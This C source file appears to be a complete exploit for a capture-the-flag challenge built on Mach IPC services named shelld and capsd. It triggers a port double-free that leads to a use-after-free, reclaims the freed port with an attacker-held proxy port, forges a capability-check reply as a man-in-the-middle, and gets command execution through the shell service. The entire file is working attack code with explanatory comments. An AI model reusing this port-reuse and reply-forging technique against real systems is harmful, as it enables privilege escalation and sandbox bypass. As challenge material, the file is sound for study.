#include <stdio.h>
#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <mach/message.h>
#include <bootstrap.h>
#include "shelld.h"
#include "shelld_client.h"
#include "common.h"
//Common Assertions
#define ASSERT(c) if (!(c)) { printf("[-] assertion \"" #c "\" failed!\n"); exit(-1); }
#define ASSERT_MACH_SUCCESS(r, name) if (r != 0) { printf("[-] %s failed: %s!\n", name, mach_error_string(r)); exit(-1); }
#define ASSERT_SUCCESS(r, name) if (r != 0) { printf("[-] %s failed!\n", name); exit(-1); }
#define ASSERT_KERN_SUCCESS(r, name) if (r != 0) { printf("[-] %s failed!\n", name); exit(-1); }
//Structure
typedef struct{
	mach_msg_header_t 	Head;
	NDR_record_t 		NDR;	//Pass-in input argument
	kern_return_t 		RetCode;//These 3 are common for MIG
	int 				out;	//Result
} Reply__has_capability_t;
typedef __Request__shelld_client_notify_t Request__shelld_client_notify_t;
mach_port_t shelld_port;
mach_port_t capsd_port;
mach_port_t bootstrap_port;

int main(){
	//Find service ports
	puts("[*] Finding service ports...");
	ASSERT_MACH_SUCCESS(task_get_bootstrap_port(mach_task_self(), &bootstrap_port), "task_get_bootstrap_port");
	ASSERT_MACH_SUCCESS(bootstrap_look_up(bootstrap_port, "net.saelo.capsd", &capsd_port), "bootstrap_look_up");
	ASSERT_MACH_SUCCESS(bootstrap_look_up(bootstrap_port, "net.saelo.shelld", &shelld_port), "bootstrap_look_up");
	//Trigger bug
	/*
	capsd_port will be deallocated twice, one by code and one by MIG since KERN_FAILURE
	uref will decrease to 0 leading to mach port being destroyed allowing port use-after-free
	Doing this a few time to make sure that all urefs are clean
	*/
	puts("[*] Triggering bug and free ports...");
	for(int _=0;_<100;_++)
	register_completion_listener(shelld_port,"non-existent-session",capsd_port);
	//Create a session
	puts("[*] Creating a session with very long name...");
	char* session = calloc(4096, sizeof(char));//Long session name to make sandbox refuse to work due to long folder path
	memset(session,'a',4095*sizeof(char));
	ASSERT_KERN_SUCCESS(create_session(shelld_port, session), "create_session");
	//Trying to get the freed port
	puts("[*] Trying to get the freed port...");
	for(int t=1;t<=10000;t++){
		printf("[*] Try #%d\n",t);
		mach_port_name_t proxy_port;
		ASSERT_MACH_SUCCESS(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &proxy_port), "mach_port_allocate");
		ASSERT_MACH_SUCCESS(mach_port_insert_right(mach_task_self(), proxy_port, proxy_port, MACH_MSG_TYPE_MAKE_SEND), "mach_port_insert_right");
		ASSERT_KERN_SUCCESS(register_completion_listener(shelld_port, session, proxy_port),"register_completion_listener");
		//Create a queue, asynchonorously receiving messages from our ports
		dispatch_queue_t proxyQueue = dispatch_queue_create("proxy.queue", 0);
		dispatch_async(proxyQueue, ^{
			char* buf = malloc(2048);
			if(mach_msg((mach_msg_header_t*)buf, MACH_MSG_OPTION_NONE | MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 2048, proxy_port, 1, 0)==KERN_SUCCESS){
				puts("[+] We got IPC man-in-the-middle!");
				Reply__has_capability_t repl;
				memcpy(&repl,buf,sizeof(mach_msg_header_t));
				repl.Head.msgh_id = 733201;
				repl.Head.msgh_bits &= ~MACH_MSGH_BITS_COMPLEX;
				repl.Head.msgh_local_port = proxy_port;
				repl.Head.msgh_voucher_port = MACH_PORT_NULL;
				repl.Head.msgh_size = 40;
				repl.out = 1;
				repl.RetCode = 0;
				ASSERT_MACH_SUCCESS(mach_msg_send((mach_msg_header_t *)&repl), "mach_msg_send");
				return;
			}
			free(buf);
		});
		if(shell_exec(shelld_port, session, "/usr/bin/id")==KERN_SUCCESS){
			char *buf = malloc(8192);
			if(mach_msg((mach_msg_header_t*)buf, MACH_MSG_OPTION_NONE | MACH_RCV_MSG, 0, 8192, proxy_port, MACH_MSG_TIMEOUT_NONE, 0)==KERN_SUCCESS)
			{
				Request__shelld_client_notify_t *result =(Request__shelld_client_notify_t*) buf;
				printf("[i] Program exited with exit code %d\n",result->status);
				puts(result->output);
				return 0;
			}
		}
		unregister_completion_listener(shelld_port, session);
	}
}
